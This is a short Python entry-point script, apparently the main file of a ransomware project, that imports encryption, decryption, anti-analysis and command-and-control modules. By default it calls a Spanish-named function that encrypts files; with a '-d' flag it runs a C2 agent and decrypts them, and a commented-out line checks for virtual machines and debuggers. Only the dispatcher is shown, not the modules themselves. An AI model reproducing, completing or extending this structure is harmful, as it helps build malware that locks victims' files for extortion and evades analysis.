import sys
import antianalysis
import encrypt
import decrypt
import agent_c2

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        agent_c2.main()
        decrypt.descifrar_archivos()
    else:
        #antianalysis.check_virtualization_and_debbuging() 
        encrypt.cifrar_archivos()

if __name__ == "__main__":
    main()